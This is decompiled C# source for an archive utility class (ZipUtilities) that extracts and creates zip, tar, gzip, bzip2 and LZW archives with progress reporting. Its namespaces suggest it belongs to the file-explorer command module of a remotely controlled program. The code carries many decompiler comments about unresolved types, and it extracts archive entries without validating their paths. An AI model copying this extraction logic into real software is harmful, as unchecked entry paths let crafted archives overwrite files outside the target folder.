using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using ICSharpCode.SharpZipLib.BZip2;
using ICSharpCode.SharpZipLib.Core;
using ICSharpCode.SharpZipLib.GZip;
using ICSharpCode.SharpZipLib.LZW;
using ICSharpCode.SharpZipLib.Tar;
using ICSharpCode.SharpZipLib.Zip;
using ICSharpCode.SharpZipLib.Zip.Compression.Streams;
using Orcus.Shared.Commands.FileExplorer;
using Orcus.Utilities;

namespace Orcus.Commands.FileExplorer;

public static class ZipUtilities
{
	public delegate void ReportCompressionStatus(ProcessingEntry processingEntry);

	public delegate void AddProcessingEntry(ProcessingEntry processingEntry);

	private static void CollectFiles(List<FileInfo> files, DirectoryInfo directoryInfo)
	{
		FileInfo[] files2 = directoryInfo.GetFiles();
		foreach (FileInfo item in files2)
		{
			files.Add(item);
		}
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			CollectFiles(files, directoryInfo2);
		}
	}

	public static void ExtractArchive(string archivePath, string destinationDirectory, CancellationTokenEx cancellationToken, ReportCompressionStatus reportCompressionStatus, AddProcessingEntry addProcessingEntry)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Expected O, but got Unknown
		//IL_0201: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_02d3: Unknown result type (might be due to invalid IL or missing references)
		Stream stream = new FileStream(archivePath, FileMode.Open, FileAccess.Read);
		bool flag;
		switch (Path.GetExtension(archivePath)!.ToUpper())
		{
		default:
			stream.Dispose();
			break;
		case ".LZW":
		{
			LzwInputStream val3 = new LzwInputStream(stream);
			val3.set_IsStreamOwner(true);
			stream = (Stream)val3;
			flag = archivePath.EndsWith(".tar.lzw", StringComparison.OrdinalIgnoreCase);
			goto IL_00d8;
		}
		case ".BZ2":
		{
			BZip2InputStream val2 = new BZip2InputStream(stream);
			val2.set_IsStreamOwner(true);
			stream = (Stream)val2;
			flag = archivePath.EndsWith(".tar.bz2", StringComparison.OrdinalIgnoreCase);
			goto IL_00d8;
		}
		case ".GZ":
		{
			GZipInputStream val = new GZipInputStream(stream);
			((InflaterInputStream)val).set_IsStreamOwner(true);
			stream = (Stream)val;
			flag = archivePath.EndsWith(".tar.gz", StringComparison.OrdinalIgnoreCase);
			goto IL_00d8;
		}
		case ".TAR":
			flag = true;
			goto IL_00d8;
		case ".ZIP":
			{
				new FastZip().ExtractZip(stream, destinationDirectory, (Overwrite)2, (ConfirmOverwriteDelegate)null, (string)null, (string)null, true, true);
				break;
			}
			IL_00d8:
			Directory.CreateDirectory(destinationDirectory);
			using (stream)
			{
				if (flag)
				{
					TarArchive val4 = TarArchive.CreateInputTarArchive(stream);
					try
					{
						TarEntry lastEntry = null;
						ProcessingEntry lastProcessingEntry = null;
						val4.add_ProgressMessageEvent((ProgressMessageHandler)delegate(TarArchive archive, TarEntry entry, string message)
						{
							//IL_0062: Unknown result type (might be due to invalid IL or missing references)
							//IL_0067: Unknown result type (might be due to invalid IL or missing references)
							//IL_006e: Unknown result type (might be due to invalid IL or missing references)
							//IL_0079: Unknown result type (might be due to invalid IL or missing references)
							//IL_0085: Unknown result type (might be due to invalid IL or missing references)
							//IL_0090: Unknown result type (might be due to invalid IL or missing references)
							//IL_00a1: Expected O, but got Unknown
							if (lastEntry != entry)
							{
								if (lastEntry != null)
								{
									lastProcessingEntry.set_Progress(1f);
									lastProcessingEntry.set_Size(entry.get_Size());
									ThreadPool.QueueUserWorkItem(delegate
									{
										reportCompressionStatus(lastProcessingEntry);
									});
								}
								lastEntry = entry;
								ProcessingEntry val6 = new ProcessingEntry();
								val6.set_Action((ProcessingEntryAction)1);
								val6.set_CreationTime(DateTime.UtcNow);
								val6.set_Path(entry.get_File());
								val6.set_Progress(0f);
								val6.set_Name(entry.get_Name());
								lastProcessingEntry = val6;
								ThreadPool.QueueUserWorkItem(delegate
								{
									addProcessingEntry(lastProcessingEntry);
								});
							}
						});
						val4.ExtractContents(destinationDirectory);
						break;
					}
					finally
					{
						((IDisposable)val4)?.Dispose();
					}
				}
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(archivePath);
				string path = Path.Combine(destinationDirectory, fileNameWithoutExtension);
				ProcessingEntry val5 = new ProcessingEntry();
				val5.set_Action((ProcessingEntryAction)1);
				val5.set_CreationTime(DateTime.UtcNow);
				val5.set_IsDirectory(false);
				val5.set_IsInterminate(false);
				val5.set_LastAccess(DateTime.UtcNow);
				val5.set_Path(path);
				val5.set_Name(fileNameWithoutExtension);
				ProcessingEntry processingEntry = val5;
				byte[] array = new byte[4096];
				FileStream destinationFileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite);
				try
				{
					addProcessingEntry(processingEntry);
					StreamUtils.Copy(stream, (Stream)destinationFileStream, array, (ProgressHandler)delegate(object sender, ProgressEventArgs e)
					{
						processingEntry.set_Progress(e.get_PercentComplete() / 100f);
						processingEntry.set_Size(destinationFileStream.Length);
						e.set_ContinueRunning(!cancellationToken.IsCanceled);
						ThreadPool.QueueUserWorkItem(delegate
						{
							reportCompressionStatus(processingEntry);
						});
					}, TimeSpan.FromSeconds(1.0), (object)null, (string)null);
					if (cancellationToken.IsCanceled)
					{
						processingEntry.set_Progress(-1f);
						ThreadPool.QueueUserWorkItem(delegate
						{
							reportCompressionStatus(processingEntry);
						});
						break;
					}
					processingEntry.set_Progress(1f);
					processingEntry.set_Size(destinationFileStream.Length);
					ThreadPool.QueueUserWorkItem(delegate
					{
						reportCompressionStatus(processingEntry);
					});
					break;
				}
				finally
				{
					if (destinationFileStream != null)
					{
						((IDisposable)destinationFileStream).Dispose();
					}
				}
			}
		}
	}

	public static void CreateArchive(ArchiveOptions archiveOptions, ProcessingEntry processingEntry, CancellationTokenEx cancellationToken, ReportCompressionStatus reportCompressionStatus)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected I4, but got Unknown
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Unknown result type (might be due to invalid IL or missing references)
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c3: Expected O, but got Unknown
		//IL_02c8: Expected O, but got Unknown
		//IL_0446: Unknown result type (might be due to invalid IL or missing references)
		//IL_044b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0453: Expected O, but got Unknown
		//IL_0485: Unknown result type (might be due to invalid IL or missing references)
		//IL_048a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0496: Expected O, but got Unknown
		//IL_04cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d5: Expected O, but got Unknown
		//IL_068c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0691: Unknown result type (might be due to invalid IL or missing references)
		//IL_0694: Expected O, but got Unknown
		//IL_0699: Expected O, but got Unknown
		//IL_07e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0803: Expected O, but got Unknown
		Orcus.Utilities.Lazy<string> lazy = new Orcus.Utilities.Lazy<string>(delegate
		{
			EntryInfo val13 = archiveOptions.get_Entries()[0];
			return (val13.get_IsDirectory() ? new DirectoryInfo(val13.get_Path()).Parent!.FullName : new FileInfo(val13.get_Path()).DirectoryName).TrimEnd(new char[1] { '\\' });
		});
		Stream outputStream = new FileStream(archiveOptions.get_ArchivePath(), FileMode.Create, FileAccess.ReadWrite);
		CompressionMethod compressionMethod = archiveOptions.get_CompressionMethod();
		switch ((int)compressionMethod)
		{
		default:
			throw new ArgumentException("Unknown compression method: " + archiveOptions.get_CompressionMethod());
		case 1:
		{
			ZipOutputStream val4 = new ZipOutputStream(outputStream);
			((DeflaterOutputStream)val4).set_IsStreamOwner(true);
			ZipOutputStream zipStream = val4;
			try
			{
				zipStream.SetLevel(archiveOptions.get_CompressionLevel());
				((DeflaterOutputStream)zipStream).set_Password(archiveOptions.get_Password());
				int length = lazy.Value.Length;
				List<FileInfo> list = new List<FileInfo>();
				foreach (EntryInfo entry in archiveOptions.get_Entries())
				{
					if (entry.get_IsDirectory())
					{
						CollectFiles(list, new DirectoryInfo(entry.get_Path()));
					}
					else
					{
						list.Add(new FileInfo(entry.get_Path()));
					}
				}
				double totalLength2 = list.Sum((FileInfo x) => x.Length);
				long currentLength2 = 0L;
				Stopwatch updateStopwatch2 = Stopwatch.StartNew();
				ProgressHandler val7 = default(ProgressHandler);
				foreach (FileInfo item in list)
				{
					ZipEntry val5 = new ZipEntry(ZipEntry.CleanName(item.FullName.Substring(length)));
					val5.set_DateTime(item.LastWriteTime);
					val5.set_AESKeySize((!string.IsNullOrEmpty(archiveOptions.get_Password())) ? 256 : 0);
					val5.set_Size(item.Length);
					ZipEntry val6 = val5;
					byte[] array = new byte[4096];
					FileStream fileStream;
					try
					{
						fileStream = item.OpenRead();
					}
					catch (Exception)
					{
						continue;
					}
					zipStream.PutNextEntry(val6);
					using (fileStream)
					{
						ZipOutputStream obj = zipStream;
						ProgressHandler obj2 = val7;
						if (obj2 == null)
						{
							ProgressHandler val8 = delegate(object sender, ProgressEventArgs e)
							{
								UpdateProgress((float)((double)(currentLength2 + e.get_Processed()) / totalLength2));
								e.set_ContinueRunning(!cancellationToken.IsCanceled);
							};
							ProgressHandler val9 = val8;
							val7 = val8;
							obj2 = val9;
						}
						StreamUtils.Copy((Stream)fileStream, (Stream)(object)obj, array, obj2, TimeSpan.FromSeconds(1.0), (object)null, (string)null);
					}
					if (!cancellationToken.IsCanceled)
					{
						currentLength2 += item.Length;
						zipStream.CloseEntry();
						UpdateProgress((float)((double)currentLength2 / totalLength2));
						continue;
					}
					processingEntry.set_Progress(-1f);
					ThreadPool.QueueUserWorkItem(delegate
					{
						reportCompressionStatus(processingEntry);
					});
					return;
				}
				processingEntry.set_Size(((Stream)(object)zipStream).Length);
				processingEntry.set_Progress(1f);
				ThreadPool.QueueUserWorkItem(delegate
				{
					reportCompressionStatus(processingEntry);
				});
				return;
				void UpdateProgress(float progress)
				{
					if (updateStopwatch2.ElapsedMilliseconds > 1000L)
					{
						updateStopwatch2.Reset();
						processingEntry.set_Progress(progress);
						processingEntry.set_Size(((Stream)(object)zipStream).Length);
						ThreadPool.QueueUserWorkItem(delegate
						{
							reportCompressionStatus(processingEntry);
						});
						updateStopwatch2.Start();
					}
				}
			}
			finally
			{
				if (zipStream != null)
				{
					((IDisposable)zipStream).Dispose();
				}
			}
		}
		case 2:
		{
			GZipOutputStream val2 = new GZipOutputStream(outputStream);
			((DeflaterOutputStream)val2).set_IsStreamOwner(true);
			GZipOutputStream val3 = val2;
			val3.SetLevel(archiveOptions.get_CompressionLevel());
			((DeflaterOutputStream)val3).set_Password(archiveOptions.get_Password());
			outputStream = (Stream)(object)val3;
			break;
		}
		case 3:
		{
			BZip2OutputStream val = new BZip2OutputStream(outputStream);
			val.set_IsStreamOwner(true);
			outputStream = (Stream)val;
			break;
		}
		case 0:
			break;
		}
		using (outputStream)
		{
			if (archiveOptions.get_UseTarPacker())
			{
				TarOutputStream tarOutputStream = new TarOutputStream(outputStream);
				try
				{
					string text = Path.GetDirectoryName(archiveOptions.get_Entries()[0].get_Path())!.Replace('\\', '/').TrimEnd(new char[1] { '/' });
					List<FileInfo> list2 = new List<FileInfo>();
					foreach (EntryInfo entry2 in archiveOptions.get_Entries())
					{
						if (entry2.get_IsDirectory())
						{
							CollectFiles(list2, new DirectoryInfo(entry2.get_Path()));
						}
						else
						{
							list2.Add(new FileInfo(entry2.get_Path()));
						}
					}
					byte[] array2 = new byte[4096];
					double totalLength = list2.Sum((FileInfo x) => x.Length);
					long currentLength = 0L;
					Stopwatch updateStopwatch = Stopwatch.StartNew();
					ProgressHandler val11 = default(ProgressHandler);
					foreach (FileInfo item2 in list2)
					{
						Stream stream;
						try
						{
							stream = new FileStream(item2.FullName, FileMode.Open, FileAccess.Read);
						}
						catch (Exception)
						{
							continue;
						}
						using (stream)
						{
							TarEntry val10 = TarEntry.CreateEntryFromFile(item2.FullName);
							val10.set_Name(item2.FullName.Substring(text.Length + 1));
							tarOutputStream.PutNextEntry(val10);
							TarOutputStream obj3 = tarOutputStream;
							ProgressHandler obj4 = val11;
							if (obj4 == null)
							{
								ProgressHandler val12 = delegate(object sender, ProgressEventArgs e)
								{
									e.set_ContinueRunning(!cancellationToken.IsCanceled);
									if (updateStopwatch.ElapsedMilliseconds > 1000L)
									{
										updateStopwatch.Reset();
										processingEntry.set_Progress((float)((double)(currentLength + e.get_Processed()) / totalLength));
										processingEntry.set_Size(((Stream)(object)tarOutputStream).Length);
										ThreadPool.QueueUserWorkItem(delegate
										{
											reportCompressionStatus(processingEntry);
										});
										updateStopwatch.Start();
									}
								};
								ProgressHandler val9 = val12;
								val11 = val12;
								obj4 = val9;
							}
							StreamUtils.Copy(stream, (Stream)(object)obj3, array2, obj4, TimeSpan.FromSeconds(1.0), (object)null, (string)null);
							tarOutputStream.CloseEntry();
						}
						currentLength += item2.Length;
						if (cancellationToken.IsCanceled)
						{
							processingEntry.set_Progress(-1f);
							ThreadPool.QueueUserWorkItem(delegate
							{
								reportCompressionStatus(processingEntry);
							});
							return;
						}
					}
				}
				finally
				{
					if (tarOutputStream != null)
					{
						((IDisposable)tarOutputStream).Dispose();
					}
				}
			}
			else
			{
				EntryInfo obj5 = archiveOptions.get_Entries()[0];
				if (obj5.get_IsDirectory())
				{
					throw new ArgumentException("Cannot pack directory without tar/zip");
				}
				byte[] array3 = new byte[4096];
				using (FileStream fileStream3 = new FileStream(obj5.get_Path(), FileMode.Open, FileAccess.Read))
				{
					StreamUtils.Copy((Stream)fileStream3, outputStream, array3, (ProgressHandler)delegate(object sender, ProgressEventArgs e)
					{
						processingEntry.set_Progress(e.get_PercentComplete() / 100f);
						processingEntry.set_Size(outputStream.Length);
						e.set_ContinueRunning(!cancellationToken.IsCanceled);
						ThreadPool.QueueUserWorkItem(delegate
						{
							reportCompressionStatus(processingEntry);
						});
					}, TimeSpan.FromSeconds(1.0), (object)null, (string)null);
				}
				if (cancellationToken.IsCanceled)
				{
					processingEntry.set_Progress(-1f);
					ThreadPool.QueueUserWorkItem(delegate
					{
						reportCompressionStatus(processingEntry);
					});
					return;
				}
			}
			processingEntry.set_Size(outputStream.Length);
			processingEntry.set_Progress(1f);
			ThreadPool.QueueUserWorkItem(delegate
			{
				reportCompressionStatus(processingEntry);
			});
		}
	}
}
